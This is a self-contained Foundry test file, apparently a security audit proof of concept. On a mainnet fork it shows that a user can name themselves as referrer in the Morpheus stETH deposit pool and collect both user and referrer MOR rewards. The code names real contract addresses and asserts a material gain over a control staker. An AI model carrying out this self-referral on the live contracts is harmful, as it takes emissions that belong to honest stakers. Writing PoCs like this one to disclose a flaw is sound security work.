// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice Self-contained Foundry PoC for Morpheus H-001 (self-referral
/// dilution). No external dependencies: no forge-std, no remappings.
/// Run with a single command from a clean clone: `forge test`.
/// Forks Ethereum mainnet at block 26430188 via the public RPC in
/// foundry.toml. Nothing here touches mainnet.

interface Vm {
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function deal(address account, uint256 newBalance) external;
    function prank(address msgSender) external;
    function warp(uint256 newTimestamp) external;
    function mockCall(address callee, bytes calldata data, bytes calldata returnData) external;
}

Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

library console {
    address constant CONSOLE = 0x000000000000000000636F6e736F6c652e6c6f67;
    function log(string memory p0, uint256 p1) internal view {
        (bool ok, ) = CONSOLE.staticcall(abi.encodeWithSignature("log(string,uint256)", p0, p1));
        ok;
    }
}

abstract contract MinimalTest {
    function makeAddr(string memory name) internal pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(name)))));
    }
    function assertEq(uint256 a, uint256 b, string memory err) internal pure {
        require(a == b, err);
    }
    function assertGt(uint256 a, uint256 b, string memory err) internal pure {
        require(a > b, err);
    }
    function assertGe(uint256 a, uint256 b, string memory err) internal pure {
        require(a >= b, err);
    }
}

interface IStETH {
    function submit(address) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256, uint256, uint128, address) external;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function getLatestReferrerReward(uint256, address) external view returns (uint256);
    function claimReferrerTier(uint256, address) external payable;
}

interface IDistributor {
    function distributeRewards(uint256) external;
}

interface IChainLinkDataConsumer {
    function getPathId(string memory) external pure returns (bytes32);
    function dataFeeds(bytes32, uint256) external view returns (address);
}

interface IAggregator {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
    function decimals() external view returns (uint8);
}

contract MorpheusH001Test is MinimalTest {
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant CLDC = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;

    uint256 constant ETH_FORK_BLOCK = 26430188;

    address attacker;
    address control;

    function setUp() public {
        vm.createSelectFork("mainnet", ETH_FORK_BLOCK);
        attacker = makeAddr("attacker");
        control = makeAddr("control");
    }

    /// @notice After a warp the real ChainLink answers are stale, so
    /// distributeRewards would revert on price == 0. Re-serve every feed
    /// used by reward pool 0 with its live answer but a fresh updatedAt.
    function _freshFeeds() internal {
        string[5] memory paths = [
            "stETH/USD",
            "wBTC/BTC,BTC/USD",
            "wETH/USD",
            "USDC/USD",
            "USDT/USD"
        ];
        for (uint256 p = 0; p < paths.length; p++) {
            bytes32 pathId = IChainLinkDataConsumer(CLDC).getPathId(paths[p]);
            for (uint256 i = 0; ; i++) {
                address feed;
                try IChainLinkDataConsumer(CLDC).dataFeeds(pathId, i) returns (address f) {
                    feed = f;
                } catch {
                    break;
                }
                (uint80 rid, int256 answer, , , uint80 ansIn) = IAggregator(feed).latestRoundData();
                uint8 dec = IAggregator(feed).decimals();
                vm.mockCall(
                    feed,
                    abi.encodeWithSelector(IAggregator.latestRoundData.selector),
                    abi.encode(rid, answer, block.timestamp, block.timestamp, ansIn)
                );
                vm.mockCall(
                    feed,
                    abi.encodeWithSelector(IAggregator.decimals.selector),
                    abi.encode(dec)
                );
            }
        }
    }

    function _stakeSteth(address who, uint256 amount, address referrer) internal {
        vm.deal(who, amount);
        vm.prank(who);
        IStETH(STETH).submit{value: amount}(address(0));
        uint256 bal = IStETH(STETH).balanceOf(who);
        assertGe(bal, amount - 1e15, "stETH mint shortfall");
        vm.prank(who);
        IStETH(STETH).approve(DIST, type(uint256).max);
        vm.prank(who);
        IDepositPool(STETH_POOL).stake(0, amount, 0, referrer);
    }

    /// @notice H-001: self-referral. The attacker names himself as
    /// referrer, so the same 100 stETH earns a user share AND a referrer
    /// share (10% tier, 25 stETH threshold) of the fixed daily MOR emission.
    function testSelfReferralDilution() public {
        _stakeSteth(attacker, 100 ether, attacker);
        _stakeSteth(control, 100 ether, address(0));

        uint256 aUser0 = IDepositPool(STETH_POOL).getLatestUserReward(0, attacker);
        uint256 aRef0 = IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker);
        uint256 bUser0 = IDepositPool(STETH_POOL).getLatestUserReward(0, control);
        assertEq(aRef0, 0, "referrer reward nonzero before distribution");
        assertEq(bUser0, aUser0, "user rewards differ before distribution");

        vm.warp(block.timestamp + 15 days);
        _freshFeeds();
        IDistributor(DIST).distributeRewards(0);

        uint256 aUser = IDepositPool(STETH_POOL).getLatestUserReward(0, attacker);
        uint256 aRef = IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker);
        uint256 bUser = IDepositPool(STETH_POOL).getLatestUserReward(0, control);
        uint256 bRef = IDepositPool(STETH_POOL).getLatestReferrerReward(0, control);

        uint256 aTotal = aUser + aRef;
        uint256 bTotal = bUser + bRef;

        console.log("attacker user MOR:", aUser);
        console.log("attacker referrer MOR:", aRef);
        console.log("attacker total MOR:", aTotal);
        console.log("control user MOR:", bUser);
        console.log("control referrer MOR:", bRef);
        console.log("control total MOR:", bTotal);
        console.log("extra MOR to self-referrer:", aTotal - bTotal);

        assertEq(bRef, 0, "control should have no referrer reward");
        assertGt(aRef, 0, "self-referrer earned no referrer reward");
        assertGt(aTotal, bTotal, "self-referral did not increase claimable MOR");
        // The extra is material in MOR terms (tens of MOR over 15 days).
        assertGt(aTotal - bTotal, 10 ether, "extra MOR too small to matter");
    }

    /// @notice The referrer claim path actually executes: it pays the
    /// LayerZero fee and forwards the mint message for the exact amount.
    function testReferrerClaimExecutes() public {
        _stakeSteth(attacker, 100 ether, attacker);
        vm.warp(block.timestamp + 15 days);
        _freshFeeds();
        IDistributor(DIST).distributeRewards(0);

        uint256 pending = IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker);
        assertGt(pending, 0, "no referrer reward to claim");

        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        IDepositPool(STETH_POOL).claimReferrerTier{value: 0.5 ether}(0, attacker);

        assertEq(IDepositPool(STETH_POOL).getLatestReferrerReward(0, attacker), 0, "reward not zeroed after claim");
        console.log("referrer MOR claimed via LZ message:", pending);
    }
}
